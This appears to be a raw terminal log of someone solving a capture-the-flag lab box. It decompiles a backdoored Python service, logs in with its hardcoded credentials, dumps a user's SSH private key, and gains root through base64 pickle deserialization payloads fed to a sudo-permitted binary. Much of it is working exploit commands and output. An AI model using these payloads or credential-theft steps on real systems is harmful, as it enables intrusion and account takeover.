+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ pip3 install uncompyle6[13Puncompyle6 -h
+
+Usage:
+  uncompyle6 [OPTIONS]... [ FILE | DIR]...
+  uncompyle6 [--help | -h | --V | --version]
+
+Examples:
+  uncompyle6      foo.pyc bar.pyc       # decompile foo.pyc, bar.pyc to stdout
+  uncompyle6 -o . foo.pyc bar.pyc       # decompile to ./foo.pyc_dis and ./bar.pyc_dis
+  uncompyle6 -o /tmp /usr/lib/python1.5 # decompile whole library
+
+Options:
+  -o <path>     output decompiled files to this path:
+                if multiple input files are decompiled, the common prefix
+                is stripped from these names and the remainder appended to
+                <path>
+                  uncompyle6 -o /tmp bla/fasel.pyc bla/foo.pyc
+                    -> /tmp/fasel.pyc_dis, /tmp/foo.pyc_dis
+                  uncompyle6 -o /tmp bla/fasel.pyc bar/foo.pyc
+                    -> /tmp/bla/fasel.pyc_dis, /tmp/bar/foo.pyc_dis
+                  uncompyle6 -o /tmp /usr/lib/python1.5
+                    -> /tmp/smtplib.pyc_dis ... /tmp/lib-tk/FixTk.pyc_dis
+  --compile | -c <python-file>
+                attempts a decompilation after compiling <python-file>
+  -d            print timestamps
+  -p <integer>  use <integer> number of processes
+  -r            recurse directories looking for .pyc and .pyo files
+  --fragments   use fragments deparser
+  --verify      compare generated source with input byte-code
+  --verify-run  compile generated source, run it and check exit code
+  --syntax-verify compile generated source
+  --linemaps    generated line number correspondencies between byte-code
+                and generated source output
+  --encoding  <encoding>
+                use <encoding> in generated source according to pep-0263
+  --help        show this message
+
+Debugging Options:
+  --asm     | -a        include byte-code       (disables --verify)
+  --grammar | -g        show matching grammar
+  --tree={before|after}
+  -t {before|after}     include syntax before (or after) tree transformation
+                        (disables --verify)
+  --tree++ | -T         add template rules to --tree=before when possible
+
+Extensions of generated files:
+  '.pyc_dis' '.pyo_dis'   successfully decompiled (and verified if --verify)
+    + '_unverified'       successfully decompile but --verify failed
+    + '_failed'           decompile failed (contact author for enhancement)
+
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ uncompyle6 -h cmd_service.pyc 
+
+Usage:
+  uncompyle6 [OPTIONS]... [ FILE | DIR]...
+  uncompyle6 [--help | -h | --V | --version]
+
+Examples:
+  uncompyle6      foo.pyc bar.pyc       # decompile foo.pyc, bar.pyc to stdout
+  uncompyle6 -o . foo.pyc bar.pyc       # decompile to ./foo.pyc_dis and ./bar.pyc_dis
+  uncompyle6 -o /tmp /usr/lib/python1.5 # decompile whole library
+
+Options:
+  -o <path>     output decompiled files to this path:
+                if multiple input files are decompiled, the common prefix
+                is stripped from these names and the remainder appended to
+                <path>
+                  uncompyle6 -o /tmp bla/fasel.pyc bla/foo.pyc
+                    -> /tmp/fasel.pyc_dis, /tmp/foo.pyc_dis
+                  uncompyle6 -o /tmp bla/fasel.pyc bar/foo.pyc
+                    -> /tmp/bla/fasel.pyc_dis, /tmp/bar/foo.pyc_dis
+                  uncompyle6 -o /tmp /usr/lib/python1.5
+                    -> /tmp/smtplib.pyc_dis ... /tmp/lib-tk/FixTk.pyc_dis
+  --compile | -c <python-file>
+                attempts a decompilation after compiling <python-file>
+  -d            print timestamps
+  -p <integer>  use <integer> number of processes
+  -r            recurse directories looking for .pyc and .pyo files
+  --fragments   use fragments deparser
+  --verify      compare generated source with input byte-code
+  --verify-run  compile generated source, run it and check exit code
+  --syntax-verify compile generated source
+  --linemaps    generated line number correspondencies between byte-code
+                and generated source output
+  --encoding  <encoding>
+                use <encoding> in generated source according to pep-0263
+  --help        show this message
+
+Debugging Options:
+  --asm     | -a        include byte-code       (disables --verify)
+  --grammar | -g        show matching grammar
+  --tree={before|after}
+  -t {before|after}     include syntax before (or after) tree transformation
+                        (disables --verify)
+  --tree++ | -T         add template rules to --tree=before when possible
+
+Extensions of generated files:
+  '.pyc_dis' '.pyo_dis'   successfully decompiled (and verified if --verify)
+    + '_unverified'       successfully decompile but --verify failed
+    + '_failed'           decompile failed (contact author for enhancement)
+
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ uncompyle6 -h cmd_service.pyc [1P[1P[1P
+# uncompyle6 version 3.7.4
+# Python bytecode 3.8 (3413)
+# Decompiled from: Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
+# [GCC 9.3.0]
+# Embedded file name: ./cmd_service.py
+# Compiled at: 2020-05-14 23:25:16
+# Size of source mod 2**32: 2140 bytes
+from Crypto.Util.number import bytes_to_long, long_to_bytes
+import sys, textwrap, socketserver, string, readline, threading
+from time import *
+import getpass, os, subprocess
+username = long_to_bytes(1684630636)
+password = long_to_bytes(2457564920124666544827225107428488864802762356)
+
+class Service(socketserver.BaseRequestHandler):
+
+    def ask_creds(self):
+        username_input = self.receive(b'Username: ').strip()
+        password_input = self.receive(b'Password: ').strip()
+        print(username_input, password_input)
+        if username_input == username:
+            if password_input == password:
+                return True
+        return False
+
+    def handle(self):
+        loggedin = self.ask_creds()
+        if not loggedin:
+            self.send(b'Wrong credentials!')
+            return None
+        self.send(b'Successfully logged in!')
+        while True:
+            command = self.receive(b'Cmd: ')
+            p = subprocess.Popen(command,
+              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
+            self.send(p.stdout.read())
+
+    def send(self, string, newline=True):
+        if newline:
+            string = string + b'\n'
+        self.request.sendall(string)
+
+    def receive(self, prompt=b'> '):
+        self.send(prompt, newline=False)
+        return self.request.recv(4096).strip()
+
+
+class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
+    pass
+
+
+def main():
+    print('Starting server...')
+    port = 7321
+    host = '0.0.0.0'
+    service = Service
+    server = ThreadedService((host, port), service)
+    server.allow_reuse_address = True
+    server_thread = threading.Thread(target=(server.serve_forever))
+    server_thread.daemon = True
+    server_thread.start()
+    print('Server started on ' + str(server.server_address) + '!')
+    while True:
+        sleep(10)
+
+
+if __name__ == '__main__':
+    main()
+# okay decompiling cmd_service.pyc
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ subl scr[K[K[Kpymod.py
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ python3 y[Kpymod.py 
+b'dill'
+b'n3v3r_@_d1ll_m0m3nt'
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ nc 10.10.112.107 7321
+Username: dill
+Password: n3v3r_@_d1ll_m0m3nt
+Successfully logged in!
+Cmd: ls
+
+Cmd: pwd
+/var/cmd
+
+Cmd: she   bash -p
+
+Cmd: cat 
+
+Cmd: cat /home/dill/user.txt
+f1e13335c47306e193212c98fc07b6a0
+
+Cmd: id
+uid=1003(dill) gid=1003(dill) groups=1003(dill)
+
+Cmd: cd..
+
+Cmd: ls
+
+Cmd: pwd
+/var/cmd
+
+Cmd: car   t /home/dill/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+/V7pwBay5mHnsAAAAKam9obkB4cHMxNQE=
+-----END OPENSSH PRIVATE KEY-----
+
+Cmd: exit
+
+Cmd: ^C
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ subl id[K[Krsa
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ rsa[K[K[Kchmod +[K600 id[K[Krsa 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ ssh -i rsa dill@ [K10.10.112.107
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-177-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+28 packages can be updated.
+19 updates are security updates.
+
+
+Last login: Wed May 20 21:56:05 2020 from 10.1.122.133
+dill@ubuntu-xenial:~$ ls
+user.txt
+dill@ubuntu-xenial:~$ cat user.txt 
+f1e13335c47306e193212c98fc07b6a0
+dill@ubuntu-xenial:~$ sudo -l
+Matching Defaults entries for dill on ubuntu-xenial:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dill may run the following commands on ubuntu-xenial:
+    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
+dill@ubuntu-xenial:~$ sudo -lcat user.txt ls[K[K[Kcd /opt/
+dill@ubuntu-xenial:/opt$ ls
+peak_hill_farm
+dill@ubuntu-xenial:/opt$ c[Kls -la
+total 12
+drwxr-xr-x  3 root root 4096 May 20  2020 .
+drwxr-xr-x 25 root root 4096 Apr  2 19:40 ..
+drwxr-xr-x  2 root root 4096 May 15  2020 peak_hill_farm
+dill@ubuntu-xenial:/opt$ cd peak_hill_farm/
+dill@ubuntu-xenial:/opt/peak_hill_farm$ ls -la
+total 11404
+drwxr-xr-x 2 root root    4096 May 15  2020 .
+drwxr-xr-x 3 root root    4096 May 20  2020 ..
+-rwxr-x--- 1 root root  788413 May 15  2020 base_library.zip
+-rwxr-x--- 1 root root   22000 Apr 17  2020 _bz2.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--- 1 root root  149880 Apr 17  2020 _codecs_cn.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--- 1 root root  158104 Apr 17  2020 _codecs_hk.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--- 1 root root   31128 Apr 17  2020 _codecs_iso2022.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--- 1 root root  268664 Apr 17  2020 _codecs_jp.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--- 1 root root  137592 Apr 17  2020 _codecs_kr.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--- 1 root root  113016 Apr 17  2020 _codecs_tw.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--- 1 root root  156624 Apr 17  2020 _ctypes.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--- 1 root root   29488 Apr 17  2020 _hashlib.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--- 1 root root   66800 Jul  4  2019 libbz2.so.1.0
+-rwxr-x--- 1 root root 2365952 Feb 27  2019 libcrypto.so.1.0.0
+-rwxr-x--- 1 root root  166032 Sep 12  2019 libexpat.so.1
+-rwxr-x--- 1 root root  137400 Feb 12  2014 liblzma.so.5
+-rwxr-x--- 1 root root 4547880 Apr 17  2020 libpython3.5m.so.1.0
+-rwxr-x--- 1 root root  282392 Feb  4  2016 libreadline.so.6
+-rwxr-x--- 1 root root  428384 Feb 27  2019 libssl.so.1.0.0
+-rwxr-x--- 1 root root  167240 Feb 19  2016 libtinfo.so.5
+-rwxr-x--- 1 root root  104864 Jan 21  2020 libz.so.1
+-rwxr-x--- 1 root root   37616 Apr 17  2020 _lzma.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--- 1 root root   44144 Apr 17  2020 _multibytecodec.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--- 1 root root    6504 Apr 17  2020 _opcode.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--x 1 root root 1218056 May 15  2020 peak_hill_farm
+-rwxr-x--- 1 root root   31688 Apr 17  2020 readline.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--- 1 root root   15432 Apr 17  2020 resource.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--- 1 root root  118744 Apr 17  2020 _ssl.cpython-35m-x86_64-linux-gnu.so
+-rwxr-x--- 1 root root   25032 Apr 17  2020 termios.cpython-35m-x86_64-linux-gnu.so
+dill@ubuntu-xenial:/opt/peak_hill_farm$ file peak_hill_farm 
+peak_hill_farm: executable, regular file, no read permission
+dill@ubuntu-xenial:/opt/peak_hill_farm$ cat peak_hill_farm 
+cat: peak_hill_farm: Permission denied
+dill@ubuntu-xenial:/opt/peak_hill_farm$ ./peak_hill_farm 
+[1970] Cannot open self /opt/peak_hill_farm/peak_hill_farm or archive /opt/peak_hill_farm/peak_hill_farm.pkg
+dill@ubuntu-xenial:/opt/peak_hill_farm$ cp peak_hill_farm ~/dill[K[K[K[K
+cp: cannot open 'peak_hill_farm' for reading: Permission denied
+dill@ubuntu-xenial:/opt/peak_hill_farm$ lsattr
+lsattr: Permission denied While reading flags on ./_lzma.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./termios.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./libz.so.1
+lsattr: Permission denied While reading flags on ./liblzma.so.5
+lsattr: Permission denied While reading flags on ./_ctypes.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./_codecs_tw.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./libreadline.so.6
+lsattr: Permission denied While reading flags on ./_multibytecodec.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./libtinfo.so.5
+lsattr: Permission denied While reading flags on ./peak_hill_farm
+lsattr: Permission denied While reading flags on ./_codecs_iso2022.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./_codecs_hk.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./libbz2.so.1.0
+lsattr: Permission denied While reading flags on ./resource.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./_hashlib.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./libcrypto.so.1.0.0
+lsattr: Permission denied While reading flags on ./_codecs_jp.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./_opcode.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./libssl.so.1.0.0
+lsattr: Permission denied While reading flags on ./_bz2.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./_codecs_kr.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./base_library.zip
+lsattr: Permission denied While reading flags on ./libexpat.so.1
+lsattr: Permission denied While reading flags on ./libpython3.5m.so.1.0
+lsattr: Permission denied While reading flags on ./readline.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./_ssl.cpython-35m-x86_64-linux-gnu.so
+lsattr: Permission denied While reading flags on ./_codecs_cn.cpython-35m-x86_64-linux-gnu.so
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo pea[K[K[K./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: flag
+this not grow did not grow on the Peak Hill Farm! :(
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: pickle
+failed to decode base64
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: ^[[A    pickles
+failed to decode base64
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: anything
+this not grow did not grow on the Peak Hill Farm! :(
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: sjduibfisdf
+failed to decode base64
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: kjdfv
+failed to decode base64
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: sd
+failed to decode base64
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm [K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Ksudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: shbskds
+failed to decode base64
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: pickle
+failed to decode base64
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: pickles
+failed to decode base64
+dill@ubuntu-xenial:/opt/peak_hill_farm$ cGlja2xl
+cGlja2xl: command not found
+dill@ubuntu-xenial:/opt/peak_hill_farm$ cGlja2xlsudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: cGlja2xl
+this not grow did not grow on the Peak Hill Farm! :(
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: cGlja2xl
+this not grow did not grow on the Peak Hill Farm! :(
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: fasfsaf
+failed to decode base64
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: cGlja2xl
+this not grow did not grow on the Peak Hill Farm! :(
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: cGlja2xls
+failed to decode base64
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: cGlja2xlcw==
+this not grow did not grow on the Peak Hill Farm! :(
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: Y250CnN5c3RlbQpwMQooUyd1bmFtZSAtYScKcDIKdFJwMwou
+Traceback (most recent call last):
+  File "peak_hill_farm.py", line 18, in <module>
+ImportError: No module named 'nt'
+[2054] Failed to execute script peak_hill_farm
+dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNjaG1vZCB1K3MgL2Jpbi9iYXNolIWUUpQu
+This grew to: 
+0
+dill@ubuntu-xenial:/opt/peak_hill_farm$ whoami
+dill
+dill@ubuntu-xenial:/opt/peak_hill_farm$ whoami
+dill
+dill@ubuntu-xenial:/opt/peak_hill_farm$ whoamisudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: ^[[A    gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNjaG1vZCB1K3MgL2Jpbi9iYXNolIWUUpQu
+This grew to: 
+0
+dill@ubuntu-xenial:/opt/peak_hill_farm$ /bin.[K/bash
+bash-4.3$ id
+uid=1003(dill) gid=1003(dill) groups=1003(dill)
+bash-4.3$ exit
+exit
+dill@ubuntu-xenial:/opt/peak_hill_farm$ /bin/bashsudo ./peak_hill_farm 
+Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
+
+to grow: gANjcG9zaXgKc3lzdGVtCnEAWAwAAAAvYmluL2Jhc2ggLXBxAYVxAlJxAy4=
+]0;root@ubuntu-xenial: /opt/peak_hill_farm[01;32mroot@ubuntu-xenial[00m:[01;34m/opt/peak_hill_farm[00m# id
+uid=0(root) gid=0(root) groups=0(root)
+]0;root@ubuntu-xenial: /opt/peak_hill_farm[01;32mroot@ubuntu-xenial[00m:[01;34m/opt/peak_hill_farm[00m# cd /
+]0;root@ubuntu-xenial: /[01;32mroot@ubuntu-xenial[00m:[01;34m/[00m# cd root/
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# ls
+ root.txt 
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# cat root.txt
+cat: root.txt: No such file or directory
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# ;l[K[Kls -la
+total 28
+drwx------  4 root root 4096 May 18  2020 [0m[01;34m.[0m
+drwxr-xr-x 25 root root 4096 Apr  2 19:40 [01;34m..[0m
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwxr-xr-x  2 root root 4096 May 18  2020 [01;34m.nano[0m
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-r--r-----  1 root root   33 May 15  2020  root.txt 
+drwx------  2 root root 4096 May 15  2020 [01;34m.ssh[0m
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# cat  roo[K[K[K[K[K[K[K[Kcat ro[K[K[K[K[K[K.[Kcd ss[K[K.ssh/
+]0;root@ubuntu-xenial: /root/.ssh[01;32mroot@ubuntu-xenial[00m:[01;34m/root/.ssh[00m# ls
+authorized_keys
+]0;root@ubuntu-xenial: /root/.ssh[01;32mroot@ubuntu-xenial[00m:[01;34m/root/.ssh[00m# ls -la
+total 8
+drwx------ 2 root root 4096 May 15  2020 [0m[01;34m.[0m
+drwx------ 4 root root 4096 May 18  2020 [01;34m..[0m
+-rw------- 1 root root    0 May 15  2020 authorized_keys
+]0;root@ubuntu-xenial: /root/.ssh[01;32mroot@ubuntu-xenial[00m:[01;34m/root/.ssh[00m# cd ..
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# ls
+ root.txt 
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# less[K[K[K[Kmore root.txt
+more: stat of root.txt failed: No such file or directory
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# cat root.txt
+cat: root.txt: No such file or directory
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# cat root.txt[C[C"root.txt root.txt[C[C[C[C[C[C[C[C"
+cat: ' root.txt': No such file or directory
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# cat " root.txt"[1P root.txt"' root.txt"[C[C[C[C[C[C[C[C[C[C[K'
+cat: ' root.txt': No such file or directory
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# cat *
+cat: '*': No such file or directory
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# 
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# cat *
+cat: '*': No such file or directory
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# ls 
+ root.txt 
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# touch r[Kasd
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# ls
+asd   root.txt 
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# cat roo[K[K[K[K asd 
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# lsa[Kattr
+-------------e-- ./asd
+-------------e-- ./ root.txt 
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# ./ root.txt
+bash: ./: Is a directory
